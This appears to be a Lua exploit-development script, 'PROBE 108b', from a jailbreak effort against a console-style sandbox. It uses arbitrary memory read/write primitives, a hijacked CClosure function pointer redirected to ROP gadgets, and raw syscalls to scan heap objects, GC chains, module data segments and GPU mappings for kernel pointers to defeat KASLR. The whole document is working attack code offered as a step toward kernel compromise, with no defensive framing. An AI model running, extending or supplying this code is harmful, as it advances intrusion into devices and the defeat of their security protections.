-- CRASH_CLASS: MODERATE
-- PROBE 108b: CClosure gadget chain — arbitrary memory read
--
-- 108a confirmed: redirecting CClosure +0x20 to xor eax,eax;ret WORKS.
-- Lua survives when the gadget returns 0 in EAX.
--
-- Strategy for arbitrary read:
--   We don't need CClosure gadgets for arb read — we already have
--   memory.read_qword() for userland memory. The problem is:
--   A) Kernel memory is not readable from userland
--   B) We need KERNEL POINTERS to defeat KASLR
--
-- So what CAN CClosure gadgets give us that we don't already have?
--   1. Execute code paths that leak info via SIDE EFFECTS
--   2. Call internal Lua VM functions that expose state
--   3. Chain redirects to build multi-step operations
--
-- This probe tests:
--   A: Dump lua_State structure (using memory.read_qword, L is known)
--   B: Find and dump the Lua global_State
--   C: Scan for kernel-range pointers in Lua VM internal structures
--   D: Redirect to Lua's internal lua_newthread → get a new coroutine's
--      internal address, compare with L to find heap layout info
--   E: Test CClosure gadget that preserves Lua state (controlled return)

print("=== PROBE 108b: CCLOSURE ARB READ + INTERNAL LEAK ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h~=0xFFFFFFFF
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local pid=N(native.fcall_with_rax(syscall.pipe.fn_addr,20))
print("pid="..pid)

-- ============================================================
print("")
print("--- A: DUMP lua_State STRUCTURE ---")
-- Get L address from rawequal's CClosure tostring
local re_str = tostring(rawequal)
local re_hex = re_str:match(":%s*0?x?([0-9a-fA-F]+)")
if not re_hex then print("  CANNOT PARSE: "..re_str) return end
local RE = N(uint64("0x"..re_hex))

-- Read +0x20 to get the C function address (which points into eboot)
local fn_ptr = rq(RE + 0x20)
print(string.format("  rawequal CClosure=0x%s fn=%s", re_hex, fmt_ptr(fn_ptr)))

-- The CClosure structure in Lua 5.1 is:
-- +0x00: CommonHeader (GCObject *next, lu_byte tt, lu_byte marked)  = 10 bytes
-- +0x0A: lu_byte nupvalues
-- +0x0B: padding?
-- +0x10: GCObject *gclist (8 bytes on 64-bit)
-- +0x18: struct Table *env (8 bytes)
-- +0x20: lua_CFunction f (8 bytes) ← this is what we redirect
-- +0x28: TValue upvalue[1] ← first upvalue

-- But we need L (lua_State), not the CClosure.
-- When the C function is called, RDI = L. We can get L's address from
-- the Lua VM debug facilities, or we can compute it.

-- Method: use debug.getinfo or a Lua trick to get L's address
-- Actually, the simplest: allocate a userdata, its tostring gives an address.
-- Then search nearby for lua_State.

-- Better: the coroutine.running() tells us the current thread. In Lua 5.1:
local co = coroutine.running()
print(string.format("  coroutine.running() = %s (nil = main thread)", tostring(co)))

-- In Lua 5.1, coroutine.running() returns nil for the main thread.
-- We need another way to get L.

-- Method: create a C closure that stores its L to shared memory.
-- We already have the "mov [rdi],rax;ret" gadget. But that writes RAX to *RDI.
-- If RDI=L, it writes RAX into L[0] which corrupts lua_State.

-- Better: use the WMOV gadget differently. If we set up:
-- 1. CClosure fn → sequence: push rdi; pop rax; (now RAX=L) ...
-- Actually we need a gadget sequence. Let's think simpler.

-- Method: Use a known function's behavior to INFER L's address.
-- string.len("AAAA") reads from the TValue on Lua's stack.
-- The TValue contains a pointer to the string object.
-- We can get the string object's address from tostring: nope, that gives value not addr.

-- Simplest method: the CClosure at RE has +0x20 = fn.
-- When fn(L) is called, L is the lua_State*. We want to know L.
-- Trick: redirect fn to a gadget that writes L somewhere we can read.

-- We need: mov [ADDR], rdi; xor eax,eax; ret
-- Or: mov [rdi], rdi; xor eax,eax; ret (self-write — corrupts L)

-- Actually, let's use a different approach entirely:
-- Allocate a buffer, find a gadget that does mov [CONST],rdi or similar.

-- WAIT. We have native.fcall_with_rax which takes (stub, syscall_no, arg1, arg2, arg3)
-- getpid returns the pid in RAX. What if instead of getpid, we call a function
-- that returns L? No such function exists.

-- NEW IDEA: Use the existing working redirect (rawequal→type).
-- type(x) returns a string. The string's address in memory contains "number\0".
-- We can compute offsets from known string addresses to find the global_State.

-- SIMPLEST APPROACH: Just dump the CClosure's neighbors in memory.
-- The CClosure is at RE. Nearby in the heap are other Lua objects.
-- Some of these may contain pointers to lua_State or global_State.

print("")
print("  Dumping CClosure raw structure (RE to RE+0x80):")
local kptr_found = 0
for off=0,0x78,8 do
    local val = rq(RE+off)
    local tag = ""
    if off==0x20 then tag = " ← fn (C function)" end
    if is_kptr(val) then
        tag = tag .. " *** KERNEL POINTER ***"
        kptr_found = kptr_found + 1
    end
    print(string.format("  +0x%02X: %s%s", off, fmt_ptr(val), tag))
end

-- ============================================================
print("")
print("--- B: SCAN NEARBY HEAP FOR KERNEL POINTERS ---")
-- The CClosure is on the Lua GC heap. Scan ±4KB around it.
local scan_kptrs = 0
local scan_start = RE - 0x800
local scan_end = RE + 0x800
for addr=scan_start,scan_end,8 do
    local val = rq(addr)
    if is_kptr(val) then
        scan_kptrs = scan_kptrs + 1
        local delta = addr - RE
        print(string.format("  *** KPTR at RE%+d (0x%X): %s",
            delta, addr, fmt_ptr(val)))
    end
end
print(string.format("  scanned %d qwords, found %d kernel pointers",
    (scan_end-scan_start)/8, scan_kptrs))

-- ============================================================
print("")
print("--- C: FOLLOW CClosure->env (Table*) ---")
-- +0x18 is the env table pointer (in standard Lua 5.1 CClosure layout)
-- This points to the _G table. The Table structure contains more pointers.
local env_ptr = rq(RE + 0x18)
print(string.format("  CClosure +0x18 (env?): %s", fmt_ptr(env_ptr)))

if env_ptr then
    local EP = N(env_ptr)
    if EP > 0x100000 then  -- looks like a valid userland pointer
        print("  Dumping env table structure:")
        for off=0,0x78,8 do
            local val = rq(EP+off)
            local tag = ""
            if is_kptr(val) then
                tag = " *** KERNEL POINTER ***"
                kptr_found = kptr_found + 1
            end
            print(string.format("    +0x%02X: %s%s", off, fmt_ptr(val), tag))
        end
    end
end

-- ============================================================
print("")
print("--- D: FOLLOW GCObject chain from CClosure ---")
-- +0x00 is CommonHeader.next — the next GC object in the chain.
-- Walk the GC list looking for kernel pointers or lua_State.
local gc_next = rq(RE)
print(string.format("  CClosure +0x00 (gc next): %s", fmt_ptr(gc_next)))

local gc_kptrs = 0
local gc_walk = N(gc_next)
for i=1,50 do
    if gc_walk==0 or gc_walk<0x100000 then break end
    -- Scan first 0x40 bytes of each GC object
    for off=0,0x38,8 do
        local val = rq(gc_walk+off)
        if is_kptr(val) then
            gc_kptrs = gc_kptrs + 1
            print(string.format("  *** KPTR in GC obj #%d +0x%02X (0x%X): %s",
                i, off, gc_walk+off, fmt_ptr(val)))
        end
    end
    -- Follow next pointer
    local nxt = rq(gc_walk)
    if nxt==nil then break end
    gc_walk = N(nxt)
end
print(string.format("  walked GC chain, found %d kernel pointers", gc_kptrs))

-- ============================================================
print("")
print("--- E: SCAN MODULE DATA SEGMENTS ---")
-- dynlib_get_info gives us base addresses of all 39 modules.
-- The data segments (.data, .bss) might contain kernel pointers
-- placed there by the kernel during loading (GOT entries, TLS, etc.)
local sc_info = mk(593)
local info_buf = memory.alloc(0x200)

-- Check first few modules
local mod_kptrs = 0
for handle=0,5 do
    wd(info_buf, 0x160)
    pcall(function() sc_info(uint64(handle), info_buf) end)

    -- Data segment: +0x120 = data_addr, +0x128 = data_size
    local data_lo = rd(info_buf+0x120) or 0
    local data_hi = rd(info_buf+0x124) or 0
    local dsize_lo = rd(info_buf+0x128) or 0
    if data_hi<0 then data_hi=data_hi+0x100000000 end
    if data_lo<0 then data_lo=data_lo+0x100000000 end

    if data_lo==0 and data_hi==0 then break end

    local DA = N(uint64(string.format("0x%X%08X", data_hi, data_lo)))
    local dsize = dsize_lo
    if dsize<=0 then dsize=0x1000 end
    if dsize>0x10000 then dsize=0x10000 end

    print(string.format("  module %d: data=0x%X%08X size=0x%X",
        handle, data_hi, data_lo, dsize))

    -- Scan first 4KB of data segment for kernel pointers
    local scan_lim = math.min(dsize, 0x1000)
    for off=0,scan_lim-8,8 do
        local val = rq(DA+off)
        if is_kptr(val) then
            mod_kptrs = mod_kptrs + 1
            print(string.format("    *** KPTR module %d data+0x%X: %s",
                handle, off, fmt_ptr(val)))
        end
    end
end
print(string.format("  module data scan: %d kernel pointers", mod_kptrs))

-- ============================================================
print("")
print("--- F: SCAN STACK REGION ---")
-- The Lua C stack probably has kernel pointers from syscall returns
-- or signal handler frames. Let's scan the current stack area.
-- We can get approximate stack location from a local variable's address.
-- Actually, we can't get stack addresses in Lua easily.
-- But we know the pipe struct has writable areas near the stack.

-- Alternative: scan the GPU mmap region for kernel pointers
-- that leaked from DMA operations or kernel-mapped buffers.
local sc_mmap = mk(477)
local ok_gpu, gpu = pcall(function()
    return sc_mmap(uint64(0),uint64(16*0x4000),uint64(0x33),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if ok_gpu then
    local GP = N(gpu)
    print(string.format("  GPU mmap region: 0x%X", GP))
    local gpu_kptrs = 0
    -- Scan first 8 pages
    for off=0,8*0x4000-8,8 do
        local val = rq(GP+off)
        if is_kptr(val) then
            gpu_kptrs = gpu_kptrs + 1
            print(string.format("    *** KPTR GPU+0x%X: %s", off, fmt_ptr(val)))
            if gpu_kptrs >= 10 then
                print("    (capped at 10)")
                break
            end
        end
    end
    print(string.format("  GPU region: %d kernel pointers in first 8 pages", gpu_kptrs))
end

-- ============================================================
print("")
print("--- SUMMARY ---")
local total_kptrs = kptr_found + scan_kptrs + gc_kptrs + mod_kptrs
local fc=N(native.fcall_with_rax(syscall.pipe.fn_addr,20))
print(string.format("total kernel pointers found: %d", total_kptrs))
print(string.format("canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 108b COMPLETE ===")
